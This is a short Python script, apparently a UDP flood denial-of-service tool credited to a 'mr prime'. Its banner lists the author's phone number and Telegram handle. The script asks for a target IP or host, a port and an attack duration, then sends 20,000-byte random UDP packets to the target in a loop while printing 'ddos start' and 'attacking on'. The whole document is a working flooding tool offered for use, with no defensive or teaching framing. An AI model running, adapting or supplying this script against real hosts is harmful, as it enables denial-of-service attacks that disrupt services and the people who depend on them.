#!/usr/bin/python
#coded by mr prime
#colors
#----------------#
wi = "\033[1;37m"
rd = "\033[1;31m"
gr = "\033[1;32m"
yl = "\033[1;33m"
pu = "\033[1;35m"
cy = "\033[1;36m"
#----------------#
import os,socket,time,sys
#----------------#

def doss():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    payloads = os.urandom(20000)

    os.system("clear")
    print('\n')
    print(f'{gr}+welcome to mr prime ')
    print('''<-------------------------------------->
     |(@)| coded by mr prime          |(@)|
     |(@)| my number is +201210861104 |(@)|
     |(@)| my telegram is mrprime1    |(@)|
    <-------------------------------------->''')
    print(f'{gr}+hve fun bro')
    ip = input(f"{rd}+[01] ip or host Target : ")
    port = int(input(f"{pu}+[02] port: "))
    seconds = int(input(f"{yl}+[03] time the Attack : "))
    timeout = time.time() + seconds

    sent = 10 

    while True:

        try:

            if time.time() > timeout:
                break
            else:
                pass
            sock.sendto(payloads,(ip,port))
            sent += 1 
            print('ddos start')
            print(f'{cy}+ attacking on {ip} .... ') 
        except KeyboardInterrupt:
            print("")
            print(f'{cy}have a nice time \n goodbye')
            print("\n")
            print(f"{rd}keybourd interrupt")
            sys.exit()
doss()
